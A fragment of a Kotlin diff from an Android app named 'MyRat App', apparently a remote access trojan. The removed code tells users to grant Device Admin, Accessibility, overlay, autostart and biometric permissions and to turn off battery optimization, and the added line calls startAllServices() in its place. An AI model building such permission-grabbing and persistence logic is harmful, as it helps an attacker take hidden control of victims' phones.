-                "huawei" -> "Startup Management > Allow MyRat App to autostart\nAlso, enable 'Display over other apps', all 'Other permissions' (e.g., Pop-up windows, Start in background), Device Admin, Accessibility Service, and Biometric permissions in App Settings.\nFinally, disable battery optimization in Settings > Battery."
-                "samsung" -> "Device Care > Battery > MyRat App > No Restrictions\nAlso, enable 'Display over other apps', all 'Other permissions' (e.g., Pop-up windows, Start in background), Device Admin, Accessibility Service, and Biometric permissions in App Settings.\nFinally, disable battery optimization in Device Care > Battery."
-                else -> "Battery Optimization > MyRat App > Don't Optimize\nAlso, enable 'Display over other apps', all 'Other permissions' (e.g., Pop-up windows, Start in background), Device Admin, Accessibility Service, and Biometric permissions in App Settings."
-            }
-            
-            AlertDialog.Builder(activity)
-                .setTitle("Manual Instructions")
-                .setMessage(instructions)
-                .setPositiveButton("OK") { _, _ ->
-                    if (fromBatteryOptimizationSettings) {
-                        checkBatteryOptimization()
-                    } else if (fromOverlaySettings) {
-                        checkOverlayPermission()
-                    } else if (fromDeviceAdminSettings) {
-                        checkDeviceAdminPermission()
-                    } else if (fromAccessibilitySettings) {
-                        checkAccessibilityPermission()
-                    } else {
-                        requestPermissions()
-                    }
-                }
-                .setCancelable(false)
-                .show()
-        } catch (e: Exception) {
-            Logger.error("Failed to show manual instructions dialog", e)
+            startAllServices()
         }
     }
 
